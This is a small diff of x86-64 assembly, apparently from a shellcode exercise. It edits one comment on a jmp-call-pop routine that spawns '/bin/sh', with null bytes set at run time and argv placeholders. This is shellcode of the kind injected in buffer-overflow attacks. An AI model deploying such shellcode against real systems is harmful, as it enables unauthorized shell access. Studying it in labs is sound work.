@@ -23,6 +23,6 @@ section .text
  	syscall
      two:
         call one                                                                   
-        db '/bin/sh', 0xFF ; The command string (terminated by a zero)
+        db '/bin/sh', 0xFF ; The command string (the terminating zero will be set in the code)
         db 'AAAAAAAA'      ; Place holder for argv[0] 
         db 'BBBBBBBB'      ; Place holder for argv[1]
